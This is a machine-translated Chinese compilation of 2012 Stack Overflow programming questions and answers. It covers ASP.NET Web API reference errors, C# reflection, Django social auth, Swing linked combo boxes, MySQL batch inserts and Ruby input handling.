任何推土机都可以吗？我熟悉推土机。但可操作其他 API，如 apache beanutil 或 ModelMapper。随意回答任何这项技术。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-02T13:49:50.980

使用[`populate()`](http://commons.apache.org/beanutils/api/index.html)和Apache Commons [BeanUtils](http://commons.apache.org/beanutils/)[`setProperty()`](http://commons.apache.org/beanutils/api/index.html)。

首先`populate()`是一个空 bean，然后，您可以将`if`条件应用为：

```
if (urBean.getAParameter() instanceof String){
    setProperty(newBeanObject, "propertyName", urBean.getParameter());
} 
```

# asp.net - 升级到 Visual Studio 2012 RC 后出现 ASP.NET Web API 错误：找不到方法：'Void System.Net.Http.Headers.HttpHeaders.AddWithoutValidation

> ID：10862728
> 
> 赞同：12
> 
> 时间：2012-06-02T13:38:13.387
> 
> 标签：asp.net, asp.net-web-api, visual-studio-2012

升级到 Visual Studio 2012 后，我无法再访问任何 ApiController，引发以下错误：

```
Server Error in '/' Application.

Method not found: 'Void System.Net.Http.Headers.HttpHeaders.AddWithoutValidation(System.String, System.Collections.Generic.IEnumerable`1<System.String>)'.

Description: An unhandled exception occurred during the execution of the current web request. Please review the stack trace for more information about the error and where it originated in the code. 

Exception Details: System.MissingMethodException: Method not found: 'Void System.Net.Http.Headers.HttpHeaders.AddWithoutValidation(System.String, System.Collections.Generic.IEnumerable`1<System.String>)'.

Source Error: 

An unhandled exception was generated during the execution of the current web request. Information regarding the origin and location of the exception can be identified using the exception stack trace below.

Stack Trace: 

[MissingMethodException: Method not found: 'Void System.Net.Http.Headers.HttpHeaders.AddWithoutValidation(System.String, System.Collections.Generic.IEnumerable`1<System.String>)'.]
   System.Web.Http.WebHost.HttpControllerHandler.AddHeaderToHttpRequestMessage(HttpRequestMessage httpRequestMessage, String headerName, String[] headerValues) +0
   System.Web.Http.WebHost.HttpControllerHandler.ConvertRequest(HttpContextBase httpContextBase) +248
   System.Web.Http.WebHost.HttpControllerHandler.BeginProcessRequest(HttpContextBase httpContextBase, AsyncCallback callback, Object state) +79
   System.Web.Http.WebHost.HttpControllerHandler.System.Web.IHttpAsyncHandler.BeginProcessRequest(HttpContext httpContext, AsyncCallback callback, Object state) +48
   System.Web.CallHandlerExecutionStep.System.Web.HttpApplication.IExecutionStep.Execute() +268
   System.Web.HttpApplication.ExecuteStep(IExecutionStep step, Boolean& completedSynchronously) +155

Version Information: Microsoft .NET Framework Version:4.0.30319; ASP.NET Version:4.0.30319.17626 
```

任何人都知道如何解决这个问题？

* * *

## 回答 #1

> 赞同：16
> 
> 时间：2012-06-02T14:49:17.110

您在项目中引用了旧版本的 System.Net.Http。要解决此问题，请转到项目中的“参考”下，删除 System.Net.Http，然后添加 .NET 4.5 附带的版本。那应该这样做。

亨里克

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-06-04T16:26:33.753

[在此处](http://kamranicus.com/blog/posts/48/tips-for-updating-from-webapi-beta-to-webapi-rc)解决此问题和其他与 RC 相关的问题。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-10-17T12:17:22.107

**步骤 1** 从您的项目中删除以下引用：

System.Net.Http、System.Web.Http、System.Web.Http.WebHost、System.Web.Http.Common 和 System.Net.Http.Formatting

**第 2 步** 从以下位置添加上述引用（System.Web.Http.Common 和 System.Net.Http.Formatting 除外）

1.  C:\Program Files (x86)\Microsoft ASP.NET\ASP.NET MVC 4\Packages\Microsoft.AspNet.WebApi.Core.4.0.20505.0\lib\net40

2.  C:\Program Files (x86)\Microsoft ASP.NET\ASP.NET MVC 4\Packages\Microsoft.AspNet.WebApi.WebHost.4.0.20505.0\lib\net40

3.  C:\Program Files (x86)\Microsoft ASP.NET\ASP.NET MVC 4\Packages\Microsoft.Net.Http.2.0.20505.0\lib\net40

**并**添加一个新的 dll Newtonsoft.Json.dll from

1.  C:\Program Files (x86)\Microsoft ASP.NET\ASP.NET MVC 4\Packages\Newtonsoft.Json.4.5.1\lib\net40

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-07-19T10:13:55.507

这为我修好了。

```
http://forums.asp.net/t/1809919.aspx/1 
```

找不到方法：'无效 System.Net.Http.Headers.HttpHeaders.AddWithoutValidation(System.String, System.Collections.Generic.IEnumerable`1)'。

我通过以下步骤解决了它。不确定是否所有这些都是必需的，但它有效。

在 NuGet 包管理器中，卸载了 Web.API Beta 包。添加了对 System.Net.Http、System.Web.Http 和 System.Web.Http.WebHost 的引用（这些已被上一步删除）。通过 NuGet 安装 Json.Net。

此外，如果您的项目以 4.0 版本的框架为目标，则必须包含来自 NUGET 的新 Microsoft ASP.Net Web API 包集，以便为您的构建打开绿灯。Json.Net 是这些新包的依赖项，因此您无需单独安装它。

# browser - 浏览器控制版本

> ID：10862731
> 
> 赞同：1
> 
> 时间：2012-06-02T13:38:21.977
> 
> 标签：browser, version, gecko

我在某处读到 MS Visual Studio 中的 webbrowser 控件使用与我电脑上安装的 IE 相同的引擎。尽管如此，我发现这是不正确的。为了证明我的假设，我使用了各种在线浏览器检测站点。我在这里展示结果：（1）我的电脑上安装的 IE（64 位和 32 位）：浏览器信息：. 浏览器：Microsoft Internet Explorer 浏览器版本：9.0 用户代理字符串：Mozilla/5.0（兼容；MSIE 9.0；Windows NT 6.1；WOW64；Trident/5.0）

(2) webbrowser control (C#): Browser Information: Browser: Microsoft Internet Explorer Browser Version: 7.0 User Agent String: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0 .50727；.NET CLR 3.5.30729；.NET CLR 3.0.30729；媒体中心 PC 6.0；.NET4.0C；.NET4.0E)

我开始搜索它，因为每当我尝试访问特定站点时，我都会遇到与 webbrowser 控件的兼容性问题（尽管有警告，但它工作正常）。我使用 gecko 12 来模拟 firefox，但网站检测到我没有使用 firefox，我再次收到警告消息......所以问题是：我怎样才能“作弊”并绕过检测，这样我就不会了每次点击后都没有收到警告信息？我正在寻找一种程序化的方式来做到这一点。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-03T09:48:30.243

似乎没有简单的方法可以通过编程来做到这一点。这一切都在注册表中。我不明白为什么......无论如何，答案就[在这里](http://www.pedautreppe.com/post/How-can-we-render-CSS3-in-a-WebBrowser-Control-.aspx)。webbrowser 控件默认使用兼容模式。即使 IE 不会使用兼容模式，控件也会。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-04T18:59:39.557

Webbrowser 控件使用机器上安装的 IE。默认情况下，它在 IE 7 兼容模式下运行。要设置您的兼容模式，您需要在 HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Internet Explorer\Main\FeatureControl\FEATURE_BROWSER_EMULATION 中列出您的应用程序以及所需的兼容模式。

# c# - 访问私有字段

> ID：10862747
> 
> 赞同：19
> 
> 时间：2012-06-02T13:42:01.627
> 
> 标签：c#, .net, private

是否可以获取或设置私有字段？

我想得到`System.Guid.c`。有没有办法访问它，或者我应该从 strut 复制代码并公开这些字段？

* * *

## 回答 #1

> 赞同：29
> 
> 时间：2012-06-02T13:54:27.760

您可以按照 Quantic Programming 的建议使用反射

```
var guid = Guid.NewGuid();
var field= typeof (Guid).GetField("_c", BindingFlags.NonPublic |BindingFlags.GetField | BindingFlags.Instance);
var value = field.GetValue(guid); 
```

尽管如果您可以先将 guid 转换为字节数组，我可能会建议：

```
var guid = Guid.NewGuid();
var c = BitConverter.ToInt16(guid.ToByteArray(), 6); 
```

后一种方法避免使用反射。

**编辑**

您提到还需要能够设置值，您仍然可以避免反射：

```
var guid = Guid.NewGuid();
var guidBytes = guid.ToByteArray();

// get value
var c = BitConverter.ToInt16(guidBytes, 6);

// set value
Buffer.BlockCopy(BitConverter.GetBytes(c), 0, guidBytes, 6, sizeof(Int16));
var modifiedGuid = new Guid(guidBytes); 
```

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2012-06-02T13:48:37.097

您应该尝试[System.Reflection](http://msdn.microsoft.com/en-us/library/system.reflection.aspx)。这是一个例子：

```
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Reflection;

namespace AccessPrivateField
{
    class foo
    {
        public foo(string str)
        {
            this.str = str;
        }
        private string str;
        public string Get()
        {
            return this.str;
        }
    }
    class Program
    {
        static void Main(string[] args)
        {
            foo bar = new foo("hello");
            Console.WriteLine(bar.Get());
            typeof(foo).GetField("str", BindingFlags.NonPublic | BindingFlags.Instance).SetValue(bar, "changed");
            Console.WriteLine(bar.Get());
            //output:
            //hello
            //changed
        }
    }
} 
```

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2017-09-29T12:24:53.153

您可以使用扩展方法来获取任何类型的任何私有字段：

```
public static T GetFieldValue<T>(this object obj, string name) {
    var field = obj.GetType().GetField(name, BindingFlags.Public | BindingFlags.NonPublic | BindingFlags.Instance);
    return (T)field?.GetValue(obj);
} 
```

然后访问任意类型的私有字段：

```
Guid id = Guid.NewGuid();
Int16 c = id.GetFieldValue<Int16>("_c"); 
```

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2012-06-02T13:55:34.687

虽然可以通过反射来做到这一点，但简单地`c`从`System.Guid.ToByteArray()`.

```
byte[] guid = guid.ToByteArray();
short c = (short)((guid[7] << 8) | guid[6]); 
```

由于此方法使用公共和记录的方法，因此版本之间的更改较少。（一般来说，应该避免依赖私有的实现细节，因为这些细节会随着版本的变化而变化。）

# python - 用于将用户链接到 FB 帐户的 Django 包

> ID：10862748
> 
> 赞同：0
> 
> 时间：2012-06-02T13:42:05.820
> 
> 标签：python, django, facebook, authentication, django-socialauth

将普通 Django 用户链接到 FB 帐户的最合适的 Django 包是什么？设想：

1.  常规 Django 站点的用户注册帐户
2.  他使用普通的登录名/密码登录
3.  他将他的常规帐户连接到 FB 帐户，如果需要，他可以稍后将其重新链接到不同的 FB 帐户。

我似乎找不到符合所有要求的包，似乎大多数包（django-facebook，django-social-auth）都假设初始登录/注册网站是通过社交媒体完成的，而我想要的是- 定期 django 登录和一些可选/延迟访问社交媒体。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-06-02T16:25:38.427

django-social-auth 应该让你做你想做的事，因为它允许多个社交帐户（例如 Facebook、LinkedIn 等）与单个 Django 用户（核心 auth.User，而不是自定义用户类）相关联像其他一些应用程序一样使用）。

我会查看 django-social-auth 的[管道功能](http://django-social-auth.readthedocs.org/en/latest/pipeline.html#partial-pipeline "管道功能")并使用该`social_auth.backends.pipeline.social.associate_user`功能将 Facebook 帐户与现有用户相关联。

# asp.net - 触发 rowupdating 事件时，gridview 不显示新的更新值

> ID：10862749
> 
> 赞同：1
> 
> 时间：2012-06-02T13:42:13.880
> 
> 标签：asp.net

我正在使用网格视图。当我单击编辑按钮时，会出现更新和取消按钮。在修改来自 EditItemTemplate 的文本框中的值后，新值不会显示在事件处理程序 rowupdating() 中，而是我得到呈现页面时出现的值。如何从这些文本框中获取新值并继续进行？这是代码。

页面

```
 <%@ Page Language="C#" MasterPageFile="~/Master Pages/FacultyMasterpage.master" AutoEventWireup="true" CodeFile="FacultyQuestion.aspx.cs" Inherits="Faculty_FacultyQuestion" Title="Untitled Page" %>

<asp:Content ID="Content1" ContentPlaceHolderID="Content10" Runat="Server">
    &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
    <br />
    <br />
    <asp:GridView ID="GridView1" runat="server" BackColor="White" 
        BorderColor="#CC9966" BorderStyle="None" BorderWidth="1px" CellPadding="4" 
        AllowPaging="True" AutoGenerateEditButton="True" 
        onrowcancelingedit="GridView1_RowCancelingEdit" 
        onrowediting="GridView1_RowEditing" onrowupdating="GridView1_RowUpdating">
        <FooterStyle BackColor="#FFFFCC" ForeColor="#330099" />
        <RowStyle BackColor="White" ForeColor="#330099" />
        <PagerStyle BackColor="#FFFFCC" ForeColor="#330099" HorizontalAlign="Center" />
        <SelectedRowStyle BackColor="#FFCC66" Font-Bold="True" ForeColor="#663399" />
        <HeaderStyle BackColor="#990000" Font-Bold="True" ForeColor="#FFFFCC" />
    </asp:GridView>
    <br />
</asp:Content>
<asp:Content ID="Content2" ContentPlaceHolderID="Content20" Runat="Server">
</asp:Content> 
```

cs文件编码

```
using System;
using System.Collections;
using System.Configuration;
using System.Data;
using System.Linq;
using System.Web;
using System.Web.Security;
using System.Web.UI;
using System.Web.UI.HtmlControls;
using System.Web.UI.WebControls;
using System.Web.UI.WebControls.WebParts;
using System.Xml.Linq;

public partial class Faculty_FacultyQuestion : System.Web.UI.Page
{
    protected void Page_Load(object sender, EventArgs e)
    {
        if (!IsPostBack)
        {
            BindData();
        }
    }
    protected void GridView1_RowEditing(object sender, GridViewEditEventArgs e)
    {
        GridView1.EditIndex = e.NewEditIndex;
        BindData();
    }
    private void BindData()
    {
        DataTable dt = Class3.QuestionForFaculty(Convert.ToInt32(Session["rid"]));
        GridView1.DataSource = dt;
        GridView1.DataBind();

    }

    protected void GridView1_RowCancelingEdit(object sender, GridViewCancelEditEventArgs e)
    {
        e.Cancel = true;
        GridView1.EditIndex = -1;
        BindData();
    }
    protected void GridView1_RowUpdating(object sender, GridViewUpdateEventArgs e)
    {
        {

                //Retrieve the table from the session object.

            DataTable dt = Class3.QuestionForFaculty(Convert.ToInt32(Session["rid"]));
            GridView1.DataSource = dt;
            GridView1.DataBind();

                //Update the values.
                GridViewRow row = GridView1.Rows[e.RowIndex];

                dt.Rows[row.DataItemIndex]["ans"] = ((TextBox)(row.Cells[2].Controls[0])).Text;

                GridView1.EditIndex = -1;
               BindData();
        }
    }
} 
```

3 类涂层

```
using System;
using System.Data;
using System.Configuration;
using System.Linq;
using System.Web;
using System.Web.Security;
using System.Web.UI;
using System.Web.UI.HtmlControls;
using System.Web.UI.WebControls;
using System.Web.UI.WebControls.WebParts;
using System.Xml.Linq;
using System.Data.SqlClient;
using System.ComponentModel;

[DataObject]
/// <summary>
/// Summary description for Class3
/// </summary>
public class Class3
{

     private static string conn = ConfigurationManager.ConnectionStrings["ConnectionString"].ToString();
    [DataObjectMethod(DataObjectMethodType.Select)]
    public static DataTable getall()
    {
        SqlDataAdapter dp = new SqlDataAdapter("Select * from Question", conn);
        DataSet ds = new DataSet();
        dp.Fill(ds, "Question");
        return ds.Tables["Question"];
    }
    [DataObjectMethod(DataObjectMethodType.Delete)]
    public static int delete(int qid)
    {
        SqlConnection con = new SqlConnection(conn);
        SqlCommand cmd = new SqlCommand("Delete into Question qid = @a", con);
        cmd.Parameters.Add("@a", SqlDbType.VarChar).Value = qid;

        con.Open();
        int i = cmd.ExecuteNonQuery();
        con.Close();
        return(i);

    }
     [DataObjectMethod(DataObjectMethodType.Select)]
    public static DataTable QuestionForFaculty(int rid)
    {
        SqlDataAdapter dp = new SqlDataAdapter("SELECT Question.question, Question.ans,Question.qid, Subject.subjectname, Question.posteddate, Registration.name, Registration.role, Registration.rid FROM Question INNER JOIN Registration ON Question.rid = Registration.rid INNER JOIN Subject ON Question.sid = Subject.subjectid WHERE (Question.fid = '"+rid+"')", conn);
        DataSet ds = new DataSet();
        dp.Fill(ds, "Question");
        return ds.Tables["Question"];
    }

} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-02T16:03:16.557

为什么要`GridView`在活动开始时绑定数据`OnRowUpdating`？那就是你的问题！只需删除这个：

```
GridView1.DataSource = dt;
GridView1.DataBind(); 
```

**更新：**首先将此添加到您的 Class3 中（纯粹基于您的示例代码 - 未经测试）：

```
[DataObjectMethod(DataObjectMethodType.Update)]
public static int UpdateAnswer(int qid, string ans)
{
    var con = new SqlConnection(conn);
    var cmd = new SqlCommand("UPDATE Question SET ans = @ans WHERE qid = @qid", con);
    cmd.Parameters.Add("@qid", SqlDbType.VarChar).Value = qid;
    cmd.Parameters.Add("@ans", SqlDbType.VarChar).Value = ans;
    con.Open();
    int i = cmd.ExecuteNonQuery();
    con.Close();
    return(i);
} 
```

然后将`OnRowUpdating`事件更改为：

```
protected void GridView1_RowUpdating(object sender, GridViewUpdateEventArgs e)
{
    Class3.UpdateAnswer(row.DataItemIndex, ((TextBox)row.Cells[2].Controls[0]).Text);
    GridView1.EditIndex = -1;
    BindData();
} 
```

# android - 为内容解析器制作 Uri 的正确方法？

> ID：10862750
> 
> 赞同：4
> 
> 时间：2012-06-02T13:42:24.507
> 
> 标签：android

阅读以前的帖子，我可以检查我系统上的所有内容提供者。

我想知道为内容解析器制作 Uri 的正确方法是什么？我们只是把整个路径像`Uri.parse("content://org.company.example.sampleprovider/items");`还是我们应该一步一步地像

```
 Uri.builder.scheme("content://"); 
 Uri.builder.authority("org.company.example.sampleprovider"); 
```

获取物品的正确下一步是什么？Uri.matcher 是如何使用的？在这整个过程中？

# jquery - 离开放置区时重置 CSS（拖放上传）

> ID：10862757
> 
> 赞同：1
> 
> 时间：2012-06-02T13:43:50.377
> 
> 标签：jquery, image, html, drag-and-drop

在我的应用程序中，我实现了拖放上传。当您在“放置区域”上拖动并按住图像时，放置区域会更改外观，并且会显示一条文本告诉您放置文件。

如果我取消删除文件，新的 CSS 和文本仍然存在，我需要刷新页面以使其恢复正常。如何在不刷新页面的情况下将 css 重置为正常状态？

提前致谢！

```
holder.ondragover = function () {
  var information = "<div id='infoText2'>" + "<span>Drop the image here!</span>";
  $('#holder').html(information);
  this.className = 'hover';
  return false;
};
// Rest of the code 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-02T15:38:07.213

`ondragend`您可以尝试在收到事件时删除 div 并删除类名

```
holder.ondragend = function () {
  $('#intoText2').remove();
  this.removeClass();
}; 
```

# ruby - 如何从 Ruby 纤维中反复提高 StopIteration

> ID：10862758
> 
> 赞同：1
> 
> 时间：2012-06-02T13:44:16.780
> 
> 标签：ruby, exception, iteration, fiber

以下 Ruby 纤程在第一次恢复时引发 StopIteration 异常，但随后不会。是否可以制作每次恢复时都会引发异常的光纤？

```
f = Fiber.new do
  while true
    raise StopIteration
  end
end 
```

# java - 链接的组合框

> ID：10862760
> 
> 赞同：2
> 
> 时间：2012-06-02T13:44:37.830
> 
> 标签：java, swing, actionlistener, jcombobox

我正在尝试建立链接`ComboBoxes`。例如，我有三个组合框，每个组合框都有三个项目（a、b、c）。在第一个组合框的开头选择“a”，在第二个“b”中选择“c”，在第三个中选择“c”。我需要为他们做这样`ActionListener`的事情，以这种方式工作：如果将第二个列表中的选择从“b”更改为“a”，则在第一个列表中选定的项目会自动从“a”更改为“b”。

我试图以这种方式解决问题：

```
 public class MyComboBoxListener implements ActionListener {

        public void actionPerformed(ActionEvent a) {
            int i = 0;
            int j = 0;
            while (a.getSource() != valsListArray.get(i)) {
                i++;
            }
            String selected = valsListArray.get(i).getSelectedItem().toString();
            while (selected != valsListArray.get(j).getSelectedItem() && j != i) {
                j++;
            }
            String r = chosenVals[i];// in the beginnig elements are that order a, b, c
            valsListArray.get(j).setSelectedItem(chosenVals[i]);
            chosenVals[j] = r;
            chosenVals[i] = selected;
        }
    } 
```

但这并不能解决问题。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-06-02T14:05:51.080

例如（只有两个链接的 JComboBox，其余由您决定，我故意删除了第 3 个 JCombobox 的代码）

```
import java.awt.*;
import java.awt.event.*;
import java.util.*;
import javax.swing.*;

public class ComboBoxTwo extends JFrame implements ActionListener, ItemListener {

    private static final long serialVersionUID = 1L;
    private JComboBox mainComboBox;
    private JComboBox subComboBox;
    private Hashtable<Object, Object> subItems = new Hashtable<Object, Object>();

    public ComboBoxTwo() {
        String[] items = {"Select Item", "Color", "Shape", "Fruit"};
        mainComboBox = new JComboBox(items);
        mainComboBox.addActionListener(this);
        mainComboBox.addItemListener(this);
        //prevent action events from being fired when the up/down arrow keys are used
        //mainComboBox.putClientProperty("JComboBox.isTableCellEditor", Boolean.TRUE);
        getContentPane().add(mainComboBox, BorderLayout.WEST);
        subComboBox = new JComboBox();//  Create sub combo box with multiple models
        subComboBox.setPrototypeDisplayValue("XXXXXXXXXX"); // JDK1.4
        subComboBox.addItemListener(this);
        getContentPane().add(subComboBox, BorderLayout.EAST);
        String[] subItems1 = {"Select Color", "Red", "Blue", "Green"};
        subItems.put(items[1], subItems1);
        String[] subItems2 = {"Select Shape", "Circle", "Square", "Triangle"};
        subItems.put(items[2], subItems2);
        String[] subItems3 = {"Select Fruit", "Apple", "Orange", "Banana"};
        subItems.put(items[3], subItems3);
//      mainComboBox.setSelectedIndex(1);
    }

    @Override
    public void actionPerformed(ActionEvent e) {
        String item = (String) mainComboBox.getSelectedItem();
        Object o = subItems.get(item);
        if (o == null) {
            subComboBox.setModel(new DefaultComboBoxModel());
        } else {
            subComboBox.setModel(new DefaultComboBoxModel((String[]) o));
        }
    }

    @Override
    public void itemStateChanged(ItemEvent e) {
        if (e.getStateChange() == ItemEvent.SELECTED) {
            if (e.getSource() == mainComboBox) {
                if (mainComboBox.getSelectedIndex() != 0) {
                    FirstDialog firstDialog = new FirstDialog(ComboBoxTwo.this,
                            mainComboBox.getSelectedItem().toString(), "Please wait,  Searching for ..... ");
                }
            } 
        }
    }

    private class FirstDialog extends JDialog {

        private static final long serialVersionUID = 1L;

        FirstDialog(final Frame parent, String winTitle, String msgString) {
            super(parent, winTitle);
            setModalityType(Dialog.ModalityType.APPLICATION_MODAL);
            JLabel myLabel = new JLabel(msgString);
            JButton bNext = new JButton("Stop Processes");
            add(myLabel, BorderLayout.CENTER);
            add(bNext, BorderLayout.SOUTH);
            bNext.addActionListener(new ActionListener() {

                @Override
                public void actionPerformed(ActionEvent evt) {
                    setVisible(false);
                }
            });
            javax.swing.Timer t = new javax.swing.Timer(1000, new ActionListener() {

                @Override
                public void actionPerformed(ActionEvent e) {
                    setVisible(false);
                }
            });
            t.setRepeats(false);
            t.start();
            setLocationRelativeTo(parent);
            setSize(new Dimension(400, 100));
            setVisible(true);
        }
    }

    public static void main(String[] args) {
        JFrame frame = new ComboBoxTwo();
        frame.setDefaultCloseOperation(EXIT_ON_CLOSE);
        frame.pack();
        frame.setLocationRelativeTo(null);
        frame.setVisible(true);
    }
} 
```

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2012-06-02T14:13:01.040

你的问题很有趣。一种解决方案是扩展 JComboBox 使其包含对其先前选择的项目和索引的引用，这将允许您在需要时提取信息。例如：

```
import javax.swing.ComboBoxModel;
import javax.swing.JComboBox;

public class NewComboBox extends JComboBox {
   private Object previousSelectedItem = null;
   private int previousSelectedIndex = -1;

   public Object getPreviousSelectedItem() {
      return previousSelectedItem;
   }

   public int getPreviousSelectedIndex() {
      return previousSelectedIndex;
   }

   NewComboBox(ComboBoxModel aModel) {
      super(aModel);
   }

   @Override
   public void setSelectedIndex(int anIndex) {
      previousSelectedIndex = getSelectedIndex();
      previousSelectedItem = getSelectedItem();
      super.setSelectedIndex(anIndex);
   }

   @Override
   public void setSelectedItem(Object anObject) {
      previousSelectedIndex = getSelectedIndex();
      previousSelectedItem = getSelectedItem();
      super.setSelectedItem(anObject);
   }

} 
```

然后你可以根据需要使用它。例如，

```
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import javax.swing.*;

public class LinkedCombos extends JPanel {
   public static final String[] DATA = {"a", "b", "c"};
   public static final int COMBO_COUNT = 3;
   private DefaultComboBoxModel[] comboModels = new DefaultComboBoxModel[COMBO_COUNT];
   private NewComboBox[] comboBoxes = new NewComboBox[COMBO_COUNT];
   private MyComboListener myComboListener = new MyComboListener();

   public LinkedCombos() {
      for (int i = 0; i < comboModels.length; i++) {
         comboModels[i] = new DefaultComboBoxModel(DATA);
         comboBoxes[i] = new NewComboBox(comboModels[i]);
         comboBoxes[i].setSelectedIndex(i);
         comboBoxes[i].addActionListener(myComboListener);
         add(comboBoxes[i]);
      }
   }

   private class MyComboListener implements ActionListener {
      @Override
      public void actionPerformed(ActionEvent evt) {
         NewComboBox combo = (NewComboBox) evt.getSource();
         String selection = combo.getSelectedItem().toString();

         for (int i = 0; i < comboBoxes.length; i++) {
            NewComboBox comboI = comboBoxes[i];
            if (comboI != combo && comboI.getSelectedItem().equals(selection)) {
               comboI.setSelectedItem(combo.getPreviousSelectedItem());
            }
         }
      }
   }

   private static void createAndShowGui() {
      LinkedCombos mainPanel = new LinkedCombos();

      JFrame frame = new JFrame("LinkedCombos");
      frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
      frame.getContentPane().add(mainPanel);
      frame.pack();
      frame.setLocationByPlatform(true);
      frame.setVisible(true);
   }

   public static void main(String[] args) {
      SwingUtilities.invokeLater(new Runnable() {
         public void run() {
            createAndShowGui();
         }
      });
   }
} 
```

# php - 数据库查询速度

> ID：10862761
> 
> 赞同：2
> 
> 时间：2012-06-02T13:44:56.263
> 
> 标签：php, mysql, performance, optimization, batch-file

我有一个 php 脚本，它连续运行几个小时，每隔几秒钟我就有新数据要保存在数据库中。所以我可以选择在新数据可用时存储新数据，或者将它们收集到一个数组中，一旦我有 100 或 500 个就保存它们。如果我是正确的，php 不能向数据库发送多个插入查询，所以上面的两个选项将采取节省的时间完全相同。

我错了还是一个比另一个快？也许有比这些更快的第三种解决方案？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-02T13:58:44.220

您可以使用以下语法一次插入多行：

```
INSERT INTO foo
( a, b, c)
VALUES
( 1, 2, 3),
( 4, 5, 6),
( 7, 8, 9) 
```

或者，您可以在获取数据时将数据转储到分隔文件中，并且当文件中达到 100 行左右时，使用 LOAD DATA INFILE (http://dev.mysql.com/doc/refman/5.5/en/ load-data.html) 进行插入。我发现 LOAD DATA INFILE 对于导入大量数据非常有效。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-02T19:19:24.253

我推荐离线批处理存储过程选项。这样，您将：

*   保存每个脚本调用发生的连接时间（我假设是这样，但我没有看到你的脚本）
*   节省php和mysql之间的通信时间
*   保存解析解释，因为所有数据都将在 sql 引擎中一次处理

rgds。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-02T13:47:58.680

两者都不会更快。但是，如果您使用批量插入并将插入包装在事务中，它将明显更快。

```
BEGIN TRANSACTION;
INSERT INTO ...
INSERT INTO ...
INSERT INTO ...
COMMIT; 
```

这仅在存储引擎允许事务时才有效。所以最好使用 InnoDB 而不是 MyISAM。

# c# - 公共结构在其类别之外不被认可

> ID：10862763
> 
> 赞同：0
> 
> 时间：2012-06-02T13:45:21.460
> 
> 标签：c#, asp.net, visual-studio-2008

大家好。1) 我在类文件 (Films.cs) 中定义了一个公共结构，如下所示：

```
public struct CategoryDetails
        {
            ...
        } 
```

对于所有重要的事情，该类没有被放入命名空间。

2) 我有一个名为 Catalog 的 aspx 文件，其中包含一个代码隐藏文件。在代码隐藏文件中，我有这个（与 Page_Load 方法处于同一级别）：

```
private void PopulateControls()
        {
            --> here I would like to have visibility to the CategoryDetails structure, which I don't
        } 
```

我指定 Catalog.ascx.cs（代码隐藏）文件具有命名空间。

*   答：到目前为止，我尝试将 Films 类放在同一个命名空间中。没运气。
*   B. 如您所见，该结构是公开的。谢谢您的帮助。非常感激。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-02T13:54:16.663

试试`Films.CategoryDetails`吧。嵌套类/结构需要在访问时为其包装类添加前缀（如命名空间）。（除非您从该包装类中访问它）

```
private void PopulateControls()
{
    var categorydetails = new Films.CategoryDetails();
    //do stuff
} 
```

编辑：只是为了澄清，在`Films`课堂上，你不再需要给它加上前缀。（如果存在不明确的命名问题，您仍然可以为其添加前缀）：

```
namespace MyProject
{
    public class Films
    {
        public struct CategoryDetails
        {
        }

        public void DoStuff()
        {
            //both are valid
            var categorydetails = new CategoryDetails();
            var otherdetails = new Films.CategoryDetails();
        }

    }
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-02T14:03:52.333

您是在类 Films 内还是在类文件films.cs 内实现结构（在全局范围内）。尝试像这样导航您的结构

```
var categorydetails = new global::CategoryDetails(); 
```

# ruby - Perl 的“read()”函数的 Ruby 等价物是什么？

> ID：10862764
> 
> 赞同：0
> 
> 时间：2012-06-02T13:45:29.400
> 
> 标签：ruby, stdin

在 Ruby 中，我想从 STDIN 中读取一定长度的字符数据。在 Perl 中，我会做这样的事情：

```
# perl code
read(STDIN, $first_ten_chars, 10); 
```

我将如何在 Ruby 中做同样的事情？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-02T14:08:19.670

[预定义的 STDIN 变量](http://ruby.activeventure.com/manual/man-1.4/variable.html#CSTDIN)是一个[IO 对象](http://www.ruby-doc.org/core-1.9.3/IO.html)，因此它有一个接受长度和“缓冲区”作为参数的[`read`方法](http://www.ruby-doc.org/core-1.9.3/IO.html#method-i-read)，类似于 Perl`read`函数：

```
first_ten_chars = STDIN.read(10); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-02T13:52:43.867

使用红宝石 1.9：

```
first_ten_chars = STDIN.gets(10) 
```

# iphone - EXC_BAD_ACCESS 使用 [UIView animateWithDuration:animations:completion]

> ID：10862766
> 
> 赞同：0
> 
> 时间：2012-06-02T13:45:50.417
> 
> 标签：iphone, ios, exc-bad-access

好的..这是整个场景

这个概念是在屏幕上显示多个订单，用户可以向左或向右滑动以查看下一个订单。一旦订单被接受或拒绝，订单视图会向下滑动，如果订单结束，则会被旁边的或上一个替换。

我有一个标签栏视图，其中包含一个简单的 UIScrollView 和几个按钮（接受和拒绝）。在 ViewDidLoad 中，我准备了一个 Orders 数组，使用 Nib 文件初始化 ViewController（等于总订单）并将这些 ViewController 的视图添加到 ScrollView 并设置 ScrollView 的内容大小等。（用于垂直和水平滚动）

当用户点击 AcceptButton 时，会执行一个动画，将 UIScrollView 中的可见视图向下滑动，然后将其从超级视图中移除。

